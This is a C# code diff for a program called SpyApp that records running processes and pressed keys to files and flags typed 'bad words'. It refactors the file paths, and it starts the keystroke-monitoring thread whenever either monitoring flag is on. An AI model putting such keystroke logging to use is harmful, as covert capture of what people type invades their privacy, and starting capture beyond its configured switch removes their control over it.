@@ -29,17 +29,16 @@ namespace SpyApp
         /// </summary>
         public void On()
         {
-            if (_spyInfo.StatsOn)
+            if (_spyInfo.StatsOn || _spyInfo.ModerOn)
             {
                 Thread statsThread = new Thread(new ThreadStart(ProcessStats));
                 statsThread.Start();
-            }
-            if (_spyInfo.ModerOn)
-            {
+
                 Thread keysThread = new Thread(new ThreadStart(PressedKeysStats));
                 keysThread.Start();
-            }
+            }                  
         }
+        ///processes
         private void ProcessStats()
         {
             try
@@ -101,7 +100,7 @@ namespace SpyApp
                 //для системных процессов нельзя получить StartTime (не хватает прав)
                 Console.WriteLine(e.Message);
             }
-            WriteToFile(_spyInfo.ProcessesStats, info);
+            WriteToFile(_spyInfo.LaunchedProcesses, info);
         }
         private void WriteToFile(string path, string info)
         {
@@ -110,9 +109,14 @@ namespace SpyApp
                 sw.Write(info);
             }
         }
+        
+        ///keys
         private void PressedKeysStats()
         {
-            StartMonitKeys("stats.txt", "mods.txt", "badWords.txt");
+            StartMonitKeys(
+                _spyInfo.PressedKeys, 
+                _spyInfo.TypedBadWords, 
+                _spyInfo.BadWordsPath);
         }
     }
 }
